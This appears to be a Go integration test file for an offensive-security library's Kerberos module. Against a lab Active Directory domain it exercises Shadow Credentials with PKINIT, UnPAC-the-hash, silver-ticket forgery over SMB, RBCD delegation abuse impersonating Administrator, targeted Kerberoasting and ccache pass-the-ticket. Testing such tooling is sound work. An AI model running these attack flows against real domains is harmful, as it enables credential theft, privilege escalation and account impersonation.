//go:build integration

// Live integration coverage for the Kerberos attack primitives that the baseline
// suite (live_integration_test.go) does not exercise: PKINIT GetTGT (via a Shadow
// Credential minted on a disposable account), UnPAC-the-hash, silver-ticket over
// an SMB transport, the Resource-Based Constrained Delegation (RBCD) write ->
// S4U2Proxy round-trip, targeted Kerberoasting, and KRB5CCNAME ccache import.
// Excluded from the default build by the "integration" tag; every test skips
// cleanly when its configuration is absent.
//
// These tests build on the baseline KRB5_TEST_* configuration (see
// live_integration_test.go: KRB5_TEST_KDC/REALM/USER/PASS/SPN). The account named
// by KRB5_TEST_USER must be able to write the directory (create the disposable
// principals and their attributes) for the LDAP-backed tests — Administrator in a
// lab domain. The extra configuration each of these tests needs:
//
//	KRB5_TEST_TARGET       server FQDN used for the LDAP GSSAPI bind and the
//	                       cifs/<target> SPN (defaults to KRB5_TEST_KDC; a
//	                       fully-qualified name is required for the SPN to resolve).
//	KRB5_TEST_BASEDN       directory base DN for the disposable principals (e.g.
//	                       "DC=example,DC=local"); derived from KRB5_TEST_REALM when
//	                       unset.
//	KRB5_TEST_PKINIT       set to 1 to run the PKINIT GetTGT and UnPAC-the-hash
//	                       tests: they create a temporary user, register a Shadow
//	                       Credential (msDS-KeyCredentialLink) built from a
//	                       self-signed certificate, authenticate with PKINIT, and
//	                       delete the user afterwards.
//	KRB5_TEST_SILVER_KEY   the service account's long-term key, hex (a 16-byte RC4
//	                       NT hash or a 16/32-byte AES key), for the silver-ticket
//	                       forge -> SMB path. Also needs KRB5_TEST_DOMAIN_SID and a
//	                       cifs/ service reachable at KRB5_TEST_TARGET.
//	KRB5_TEST_DOMAIN_SID   account-domain SID (shared with the golden-ticket test).
//	KRB5_TEST_RBCD         set to 1 to run the RBCD test: it creates a disposable
//	                       attacker and target computer, writes the target's
//	                       msDS-AllowedToActOnBehalfOfOtherIdentity, drives
//	                       S4U2Self -> S4U2Proxy, then clears the attribute and
//	                       deletes both computers.
//	KRB5_TEST_TARGETED_ROAST set to 1 to run the targeted-Kerberoast test: it
//	                       creates a disposable user with no SPN, sets a temporary
//	                       SPN, roasts it, restores the attribute, and deletes the
//	                       user.
//
// Example (all paths):
//
//	KRB5_TEST_KDC=10.0.0.10 KRB5_TEST_REALM=EXAMPLE.LOCAL \
//	KRB5_TEST_USER=Administrator KRB5_TEST_PASS='…' \
//	KRB5_TEST_TARGET=dc.example.local KRB5_TEST_SPN=cifs/dc.example.local \
//	KRB5_TEST_PKINIT=1 KRB5_TEST_RBCD=1 KRB5_TEST_TARGETED_ROAST=1 \
//	KRB5_TEST_SILVER_KEY=<machine-NT-hash> KRB5_TEST_DOMAIN_SID=S-1-5-21-… \
//	  go test -tags integration -v -run TestLiveKerberos ./network/kerberos/v5/
package kerberos_test

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf16"

	ntpkg "github.com/TheManticoreProject/Manticore/crypto/nt"
	kerberos "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/messages"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/pkinit"
	"github.com/TheManticoreProject/Manticore/network/ldap"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/smb_v20/client"
	"github.com/TheManticoreProject/Manticore/windows/cng/bcrypt/keys"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	kcl "github.com/TheManticoreProject/Manticore/windows/keycredentiallink"
	"github.com/TheManticoreProject/winacl/sid"
)

// target returns the server FQDN used for LDAP binds and cifs/host SPNs, falling
// back to the KDC host when KRB5_TEST_TARGET is unset.
func (e krbEnv) target() string {
	if t := os.Getenv("KRB5_TEST_TARGET"); t != "" {
		return t
	}
	return e.KDC
}

// baseDN returns the directory base DN for the disposable principals, taken from
// KRB5_TEST_BASEDN or derived from the realm ("A.B" -> "DC=A,DC=B").
func (e krbEnv) baseDN() string {
	if b := os.Getenv("KRB5_TEST_BASEDN"); b != "" {
		return b
	}
	labels := strings.Split(e.Realm, ".")
	for i, l := range labels {
		labels[i] = "DC=" + l
	}
	return strings.Join(labels, ",")
}

// netbios returns the domain NetBIOS name (the realm's first label, uppercased),
// used cosmetically in a forged PAC's LogonDomainName/LogonServer.
func (e krbEnv) netbios() string {
	return strings.ToUpper(strings.SplitN(e.Realm, ".", 2)[0])
}

// dnsDomain returns the lowercase DNS domain (the realm lowercased), used to build
// disposable computers' dNSHostName / SPNs.
func (e krbEnv) dnsDomain() string { return strings.ToLower(e.Realm) }

// ldapWriteSession opens a GSSAPI-sealed LDAP session bound as the baseline
// account, for creating and mutating the disposable principals the attack tests
// need. The caller closes it.
func (e krbEnv) ldapWriteSession(t *testing.T) *ldap.Session {
	t.Helper()
	creds, err := credentials.NewCredentials(e.Realm, e.User, e.Pass, "")
	if err != nil {
		t.Fatalf("NewCredentials: %v", err)
	}
	sess, err := ldap.NewSession(e.target(), 389, creds, false, true)
	if err != nil {
		t.Fatalf("ldap.NewSession: %v", err)
	}
	sess.SetGSSAPISealing()
	if ok, err := sess.Connect(); err != nil || !ok {
		t.Fatalf("LDAP GSSAPI bind: ok=%v err=%v", ok, err)
	}
	return sess
}

// unicodePwd encodes a password as the UTF-16LE quoted form AD requires when
// writing the unicodePwd attribute over a confidential (sealed) connection.
func unicodePwd(pw string) string {
	u := utf16.Encode([]rune("\"" + pw + "\""))
	b := make([]byte, len(u)*2)
	for i, r := range u {
		b[2*i] = byte(r)
		b[2*i+1] = byte(r >> 8)
	}
	return string(b)
}

// pkinitViaShadowCred mints a PKINIT-capable Kerberos client for a fresh,
// disposable user: it creates the user with a known password, registers a Shadow
// Credential (a self-signed certificate's public key written to the target's
// msDS-KeyCredentialLink), and returns a client configured with WithPKINIT plus
// the account's expected NT hash and a cleanup function that removes the user. The
// cleanup runs even if a later step fails (the caller defers it immediately).
func pkinitViaShadowCred(t *testing.T, e krbEnv) (client *kerberos.KerberosClient, expectedNT []byte, cleanup func()) {
	t.Helper()
	const (
		tmpUser = "mtc-pkinit-test"
		tmpPass = "Sh@dowPk!nit-2026x"
	)
	tmpDN := fmt.Sprintf("CN=%s,CN=Users,%s", tmpUser, e.baseDN())

	sess := e.ldapWriteSession(t)
	cleanup = func() {
		if err := sess.Delete(tmpDN); err != nil {
			t.Logf("[cleanup] delete %s: %v", tmpDN, err)
		}
		sess.Close()
	}

	_ = sess.Delete(tmpDN) // clear any stale principal from a prior run
	add := ldap.NewAddRequest(tmpDN)
	add.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user"})
	add.Attribute("sAMAccountName", []string{tmpUser})
	add.Attribute("userPrincipalName", []string{tmpUser + "@" + e.dnsDomain()})
	add.Attribute("unicodePwd", []string{unicodePwd(tmpPass)})
	add.Attribute("userAccountControl", []string{"512"}) // NORMAL_ACCOUNT, enabled
	if err := sess.Add(add); err != nil {
		cleanup()
		t.Fatalf("create temp user %s: %v", tmpDN, err)
	}

	// Self-signed certificate -> CNG RSA public-key blob -> msDS-KeyCredentialLink.
	priv, certDER, err := pkinit.GenerateSelfSignedCert(2048, "mtc-pkinit-test")
	if err != nil {
		cleanup()
		t.Fatalf("GenerateSelfSignedCert: %v", err)
	}
	keyMaterial, err := keys.NewBCRYPT_RSA_PUBLIC_KEY(&priv.PublicKey).Marshal()
	if err != nil {
		cleanup()
		t.Fatalf("marshal RSA key material: %v", err)
	}
	dnb, err := kcl.ComposeKeyCredentialLinkForComputer(tmpDN, keyMaterial)
	if err != nil {
		cleanup()
		t.Fatalf("compose KeyCredentialLink: %v", err)
	}
	if err := ldap.AddKeyCredentialLinkDNBinary(sess, tmpDN, dnb); err != nil {
		cleanup()
		t.Fatalf("write msDS-KeyCredentialLink: %v", err)
	}

	nt := ntpkg.NTHash(tmpPass)
	client = kerberos.NewClient(tmpUser, e.Realm, e.KDC).
		WithPKINIT(priv, certDER).
		InsecureSkipPKINITKDCSignatureCheck()
	return client, nt[:], cleanup
}

// TestLiveKerberos_PKINIT_GetTGT registers a Shadow Credential on a disposable
// user, obtains a TGT with certificate-based PKINIT pre-authentication (RFC 4556),
// and proves the PKINIT-derived TGT is usable with a real TGS exchange for
// KRB5_TEST_SPN. Skipped unless KRB5_TEST_PKINIT is set.
func TestLiveKerberos_PKINIT_GetTGT(t *testing.T) {
	e := requireKrbEnv(t)
	if os.Getenv("KRB5_TEST_PKINIT") == "" {
		t.Skip("set KRB5_TEST_PKINIT=1 (and KRB5_TEST_TARGET) to run the PKINIT Shadow-Credentials test")
	}
	if e.SPN == "" {
		t.Skip("set KRB5_TEST_SPN to a requestable service principal name to run the PKINIT GetTGT test")
	}

	client, _, cleanup := pkinitViaShadowCred(t, e)
	defer cleanup()

	if err := client.GetTGT(); err != nil {
		t.Fatalf("PKINIT GetTGT: %v", err)
	}
	if !client.HasTGT() {
		t.Fatal("PKINIT GetTGT reported success but HasTGT() is false")
	}
	key, etype := client.PKINITReplyKey()
	if len(key) == 0 {
		t.Fatal("PKINIT reply key is empty after a successful GetTGT")
	}
	if _, _, _, _, err := client.GetTGS(e.SPN, true); err != nil {
		t.Fatalf("GetTGS with the PKINIT-derived TGT: %v", err)
	}
	t.Logf("[ok] PKINIT GetTGT (reply-key etype %d) + GetTGS(%s)", etype, e.SPN)
}

// TestLiveKerberos_UnPACTheHash performs a PKINIT logon and then UnPAC-the-hash,
// recovering the account's NT hash from the PAC_CREDENTIAL_INFO buffer and
// asserting it equals the disposable account's known NT hash. Skipped unless
// KRB5_TEST_PKINIT is set.
func TestLiveKerberos_UnPACTheHash(t *testing.T) {
	e := requireKrbEnv(t)
	if os.Getenv("KRB5_TEST_PKINIT") == "" {
		t.Skip("set KRB5_TEST_PKINIT=1 (and KRB5_TEST_TARGET) to run the UnPAC-the-hash test")
	}

	client, expectedNT, cleanup := pkinitViaShadowCred(t, e)
	defer cleanup()

	if err := client.GetTGT(); err != nil {
		t.Fatalf("PKINIT GetTGT: %v", err)
	}
	_, ntHash, err := client.UnPACTheHash()
	if err != nil {
		t.Fatalf("UnPACTheHash: %v", err)
	}
	if len(ntHash) == 0 {
		t.Fatal("UnPACTheHash returned an empty NT hash")
	}
	if !bytes.Equal(ntHash, expectedNT) {
		t.Fatalf("UnPAC-the-hash NT hash mismatch: got %s, want %s",
			hex.EncodeToString(ntHash), hex.EncodeToString(expectedNT))
	}
	t.Logf("[ok] UnPAC-the-hash recovered the account NT hash (%s)", hex.EncodeToString(ntHash))
}

// TestLiveKerberos_SilverOverSMB forges a silver ticket for cifs/<target> with the
// service account key, wires it into a client with no TGT (LoadForgedServiceTicket),
// and uses it to set up an SMB session and tree-connect to IPC$ — a silver-ticket
// pass-the-ticket with no KDC round-trip. Skipped unless KRB5_TEST_SILVER_KEY and
// KRB5_TEST_DOMAIN_SID are set.
func TestLiveKerberos_SilverOverSMB(t *testing.T) {
	e := requireKrbEnv(t)
	keyHex := os.Getenv("KRB5_TEST_SILVER_KEY")
	domainSID := os.Getenv("KRB5_TEST_DOMAIN_SID")
	if keyHex == "" || domainSID == "" {
		t.Skip("set KRB5_TEST_SILVER_KEY (service-account key, hex) and KRB5_TEST_DOMAIN_SID to run the silver-over-SMB test")
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		t.Fatalf("decode KRB5_TEST_SILVER_KEY: %v", err)
	}
	keyEType := messages.ETypeAES256CTSHMACSHA196
	if len(key) == 16 {
		keyEType = messages.ETypeRC4HMAC
	}

	spn := "cifs/" + e.target()
	silver, err := kerberos.ForgeSilver(kerberos.ForgeOptions{
		Realm:           e.Realm,
		Username:        "Administrator",
		DomainSID:       domainSID,
		UserRID:         500,
		PrimaryGroupRID: 513,
		LogonDomainName: e.netbios(),
		LogonServer:     e.netbios(),
		Key:             key,
		KeyEType:        keyEType,
	}, spn)
	if err != nil {
		t.Fatalf("ForgeSilver(%q): %v", spn, err)
	}

	kc := kerberos.NewClient("", "", e.KDC) // no TGT, no secret
	if err := kc.LoadForgedServiceTicket(silver); err != nil {
		t.Fatalf("LoadForgedServiceTicket: %v", err)
	}

	ip, err := net.ResolveIPAddr("ip", e.target())
	if err != nil {
		t.Fatalf("resolve %q: %v", e.target(), err)
	}
	cl := smbclient.NewClientUsingTCPTransport(ip.IP, 445)
	if err := cl.Connect(ip.IP, 445); err != nil {
		t.Fatalf("SMB Connect: %v", err)
	}
	defer cl.Disconnect()
	if err := cl.SessionSetupKerberosWithClient(kc, spn); err != nil {
		t.Fatalf("SessionSetupKerberosWithClient (silver): %v", err)
	}
	if err := cl.TreeConnect("IPC$"); err != nil {
		t.Fatalf("TreeConnect(IPC$) with silver ticket: %v", err)
	}
	t.Logf("[ok] silver ticket for %s accepted: SMB session + TreeConnect(IPC$)", spn)
}

// addDisposableComputer creates a computer account under CN=Computers with a known
// password and the given SPNs, deleting any stale object of the same name first.
func addDisposableComputer(t *testing.T, sess *ldap.Session, dn, sam, pass, fqdn string, spns []string) {
	t.Helper()
	_ = sess.Delete(dn)
	add := ldap.NewAddRequest(dn)
	add.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
	add.Attribute("sAMAccountName", []string{sam})
	add.Attribute("userAccountControl", []string{"4096"}) // WORKSTATION_TRUST_ACCOUNT
	add.Attribute("unicodePwd", []string{unicodePwd(pass)})
	add.Attribute("dNSHostName", []string{fqdn})
	if len(spns) > 0 {
		add.Attribute("servicePrincipalName", spns)
	}
	if err := sess.Add(add); err != nil {
		t.Fatalf("create computer %s: %v", dn, err)
	}
}

// TestLiveKerberos_RBCD exercises the full Resource-Based Constrained Delegation
// write path: it creates a disposable attacker and target computer, writes the
// target's msDS-AllowedToActOnBehalfOfOtherIdentity to trust the attacker SID
// (ldap.WriteRBCD), then drives S4U2Self -> S4U2Proxy as the attacker to obtain a
// service ticket to the target as Administrator. It always restores state (clears
// the attribute and deletes both computers). Skipped unless KRB5_TEST_RBCD is set.
func TestLiveKerberos_RBCD(t *testing.T) {
	e := requireKrbEnv(t)
	if os.Getenv("KRB5_TEST_RBCD") == "" {
		t.Skip("set KRB5_TEST_RBCD=1 (and KRB5_TEST_TARGET) to run the RBCD write/S4U2Proxy test")
	}

	const (
		atkName = "mtc-rbcd-atk"
		atkPass = "Atk-Rbcd!2026xyz"
		tgtName = "mtc-rbcd-tgt"
		tgtPass = "Tgt-Rbcd!2026xyz"
	)
	dnsDom := e.dnsDomain()
	atkFQDN := atkName + "." + dnsDom
	tgtFQDN := tgtName + "." + dnsDom
	atkDN := fmt.Sprintf("CN=%s,CN=Computers,%s", atkName, e.baseDN())
	tgtDN := fmt.Sprintf("CN=%s,CN=Computers,%s", tgtName, e.baseDN())

	sess := e.ldapWriteSession(t)
	defer sess.Close()

	addDisposableComputer(t, sess, atkDN, atkName+"$", atkPass, atkFQDN,
		[]string{"HOST/" + atkFQDN, "HOST/" + atkName, "RestrictedKrbHost/" + atkFQDN, "RestrictedKrbHost/" + atkName})
	defer func() {
		if err := sess.Delete(atkDN); err != nil {
			t.Logf("[cleanup] delete attacker %s: %v", atkDN, err)
		}
	}()

	addDisposableComputer(t, sess, tgtDN, tgtName+"$", tgtPass, tgtFQDN,
		[]string{"HOST/" + tgtFQDN, "HOST/" + tgtName, "cifs/" + tgtFQDN, "cifs/" + tgtName})
	defer func() {
		if err := sess.Delete(tgtDN); err != nil {
			t.Logf("[cleanup] delete target %s: %v", tgtDN, err)
		}
	}()

	// Resolve the attacker's SID and grant it delegation over the target.
	entries, err := sess.QueryBaseObject(atkDN, "(objectClass=*)", []string{"objectSid"})
	if err != nil || len(entries) == 0 {
		t.Fatalf("read attacker objectSid: %v", err)
	}
	var atkSID sid.SID
	if _, err := atkSID.Unmarshal(entries[0].GetRawAttributeValue("objectSid")); err != nil {
		t.Fatalf("parse attacker objectSid: %v", err)
	}
	if err := sess.WriteRBCD(tgtDN, atkSID.String()); err != nil {
		t.Fatalf("WriteRBCD on %s: %v", tgtDN, err)
	}
	defer func() {
		if err := sess.ClearRBCD(tgtDN); err != nil {
			t.Logf("[cleanup] ClearRBCD on %s: %v", tgtDN, err)
		}
	}()

	// Confirm the write round-trips.
	_, sids, err := sess.ReadRBCD(tgtDN)
	if err != nil {
		t.Fatalf("ReadRBCD: %v", err)
	}
	if len(sids) != 1 || sids[0] != atkSID.String() {
		t.Fatalf("RBCD read-back = %v, want [%s]", sids, atkSID.String())
	}

	// As the attacker computer (NT hash, so the machine-account salt is irrelevant),
	// obtain a TGT then S4U2Self -> S4U2Proxy to the target.
	atk := kerberos.NewClient(atkName+"$", e.Realm, e.KDC)
	atkNT := ntpkg.NTHash(atkPass)
	if err := atk.WithNTHash(hex.EncodeToString(atkNT[:])); err != nil {
		t.Fatalf("attacker WithNTHash: %v", err)
	}
	if err := atk.GetTGT(); err != nil {
		t.Fatalf("attacker GetTGT: %v", err)
	}
	_, selfRaw, _, err := atk.S4U2Self("Administrator", e.Realm)
	if err != nil {
		t.Fatalf("S4U2Self(Administrator): %v", err)
	}
	targetSPN := "cifs/" + tgtFQDN
	ticket, proxyRaw, _, err := atk.S4U2Proxy(targetSPN, selfRaw)
	if err != nil {
		t.Fatalf("S4U2Proxy(%q) over RBCD: %v", targetSPN, err)
	}
	if len(proxyRaw) == 0 {
		t.Fatalf("S4U2Proxy(%q) returned an empty ticket", targetSPN)
	}
	t.Logf("[ok] RBCD write -> S4U2Proxy(%s): sname=%v", targetSPN, ticket.SName.NameString)
}

// TestLiveKerberos_TargetedKerberoast sets a temporary SPN on a disposable user
// with no SPN of its own, roasts it (requests a service ticket whose enc-part is
// encrypted with the account key), and restores the servicePrincipalName attribute
// via ldap.TargetedKerberoast. The disposable user is deleted afterwards. Skipped
// unless KRB5_TEST_TARGETED_ROAST is set.
func TestLiveKerberos_TargetedKerberoast(t *testing.T) {
	e := requireKrbEnv(t)
	if os.Getenv("KRB5_TEST_TARGETED_ROAST") == "" {
		t.Skip("set KRB5_TEST_TARGETED_ROAST=1 (and KRB5_TEST_TARGET) to run the targeted-Kerberoast test")
	}

	const (
		roastUser = "mtc-roast-test"
		roastPass = "R0ast-Target!2026x"
	)
	userDN := fmt.Sprintf("CN=%s,CN=Users,%s", roastUser, e.baseDN())
	spn := "MTCROAST/" + roastUser + "." + e.dnsDomain()

	sess := e.ldapWriteSession(t)
	defer sess.Close()

	_ = sess.Delete(userDN)
	add := ldap.NewAddRequest(userDN)
	add.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user"})
	add.Attribute("sAMAccountName", []string{roastUser})
	add.Attribute("userPrincipalName", []string{roastUser + "@" + e.dnsDomain()})
	add.Attribute("unicodePwd", []string{unicodePwd(roastPass)})
	add.Attribute("userAccountControl", []string{"512"})
	if err := sess.Add(add); err != nil {
		t.Fatalf("create roast user %s: %v", userDN, err)
	}
	defer func() {
		if err := sess.Delete(userDN); err != nil {
			t.Logf("[cleanup] delete roast user %s: %v", userDN, err)
		}
	}()

	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT: %v", err)
	}

	var res *kerberos.KerberoastResult
	err := sess.TargetedKerberoast(userDN, spn, func() error {
		var e error
		res, e = c.Kerberoast(spn)
		return e
	})
	if err != nil {
		t.Fatalf("TargetedKerberoast(%q): %v", spn, err)
	}
	if res == nil || len(res.Cipher) == 0 {
		t.Fatalf("targeted roast of %q produced no cipher text", spn)
	}

	// The SPN must be gone again after the orchestrated restore.
	spns, err := sess.GetServicePrincipalNames(userDN)
	if err != nil {
		t.Fatalf("read SPNs after restore: %v", err)
	}
	for _, s := range spns {
		if strings.EqualFold(s, spn) {
			t.Fatalf("targeted roast left the temporary SPN %q on %s", spn, userDN)
		}
	}
	t.Logf("[ok] targeted Kerberoast of %s: etype=%d cipherLen=%d, SPN restored", spn, res.EType, len(res.Cipher))
}

// TestLiveKerberos_CCacheEnvImport exports the TGT to an MIT ccache file, points
// KRB5CCNAME at it (with the FILE: prefix), imports it into a fresh client via
// LoadTGTFromCCacheEnv, and uses that client for a TGS exchange — the ccache
// environment pass-the-ticket path. Uses only the baseline configuration.
func TestLiveKerberos_CCacheEnvImport(t *testing.T) {
	e := requireKrbEnv(t)
	if e.SPN == "" {
		t.Skip("set KRB5_TEST_SPN to run the KRB5CCNAME ccache-import test")
	}

	c := e.newClient()
	if err := c.GetTGT(); err != nil {
		t.Fatalf("GetTGT: %v", err)
	}
	cc, err := c.ExportTGTCCache()
	if err != nil {
		t.Fatalf("ExportTGTCCache: %v", err)
	}
	blob, err := cc.Marshal()
	if err != nil {
		t.Fatalf("ccache Marshal: %v", err)
	}
	path := filepath.Join(t.TempDir(), "krb5cc_test")
	if err := os.WriteFile(path, blob, 0o600); err != nil {
		t.Fatalf("write ccache file: %v", err)
	}

	t.Setenv("KRB5CCNAME", "FILE:"+path)
	ptt := kerberos.NewClient("", "", e.KDC) // identity comes from the ccache
	if err := ptt.LoadTGTFromCCacheEnv(); err != nil {
		t.Fatalf("LoadTGTFromCCacheEnv: %v", err)
	}
	if !ptt.HasTGT() {
		t.Fatal("client has no TGT after LoadTGTFromCCacheEnv")
	}
	if _, _, _, _, err := ptt.GetTGS(e.SPN, true); err != nil {
		t.Fatalf("GetTGS with the KRB5CCNAME-imported TGT: %v", err)
	}
	t.Logf("[ok] KRB5CCNAME (FILE:) import -> pass-the-ticket GetTGS(%s)", e.SPN)
}
